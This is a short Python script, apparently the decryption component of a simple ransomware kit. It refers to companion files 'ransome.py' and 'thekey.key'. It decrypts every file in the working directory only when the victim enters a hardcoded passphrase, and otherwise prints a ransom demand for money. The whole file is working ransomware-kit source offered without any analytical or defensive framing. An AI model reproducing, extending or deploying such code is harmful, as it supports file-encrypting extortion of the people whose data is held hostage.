#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#let's find some files
files = []
for file in os.listdir():
	if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file): files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"
user_phrase = input("Enter the secreate phrase to decript yor files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet (secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("congrates your files have been decripted")

else:
	print("sorry wrong phrase, send me more 100000 laks")
